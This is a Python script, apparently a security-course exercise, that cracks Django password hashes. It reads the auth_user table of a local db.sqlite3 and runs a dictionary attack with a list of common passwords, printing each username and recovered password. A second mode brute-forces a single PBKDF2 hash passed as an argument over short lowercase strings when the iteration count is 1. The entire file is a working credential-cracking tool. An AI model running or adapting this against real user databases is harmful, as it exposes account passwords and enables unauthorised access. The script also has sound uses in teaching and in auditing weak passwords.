import os
import sys
import string
import base64
import sqlite3
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


COMMON_PASSWORDS = [
    "123456",
    "123456789",
    "qwerty",
    "password",
    "1234567",
    "12345678",
    "12345",
    "iloveyou",
    "111111",
    "123123",
    "abc123",
    "qwerty123",
    "1q2w3e4r",
    "admin",
    "qwertyuiop",
    "654321",
    "555555",
    "lovely",
    "7777777",
    "welcome",
    "888888",
    "princess",
    "dragon",
    "password1",
    "123qwe",
    "thepsscracker",
]


def crack_db():

    con = sqlite3.connect("db.sqlite3")
    cursor = con.cursor()

    cursor.execute("SELECT * FROM auth_user")

    rows = cursor.fetchall()

    for row in rows:
        user = row[4]
        hashstr = row[1]
        _, iterations, salt, hashval = hashstr.split("$")
        hashval = hashval.encode()

        for common_pass in COMMON_PASSWORDS:
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt.encode(),
                iterations=int(iterations),
            )
            key = kdf.derive(common_pass.encode())
            if hashval == base64.b64encode(key):
                print(f"{user},{common_pass}")

    cursor.close()
    con.close()


lower = string.ascii_lowercase


def brute_force_helper(depth, cur_str, salt, hashval):
    # print(cur_str, salt, hashval)
    # if cur_str == "rdfh":
    #     raise Exception
    if depth >= 2:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt.encode(),
            iterations=1,
        )
        key = kdf.derive(cur_str.encode())
        if hashval == base64.b64encode(key):
            # raise Exception()
            return cur_str
    if depth < 4:
        for c in lower:
            new_str = cur_str + c
            res = brute_force_helper(depth + 1, new_str, salt, hashval)
            if res:
                return res
    else:
        return None


def brute_force(hashstr):
    _, iterations, salt, hashval = hashstr.split("$")
    if int(iterations) > 1:
        print("Cannot brute-force password in time.")
    else:
        res = brute_force_helper(0, "", salt, hashval.encode())
        if res:
            print(f"Password cracked: '{res}'")
        else:
            print(f"Password not cracked.")


if __name__ == "__main__":
    if len(sys.argv) == 2:
        brute_force(sys.argv[1])
    else:
        crack_db()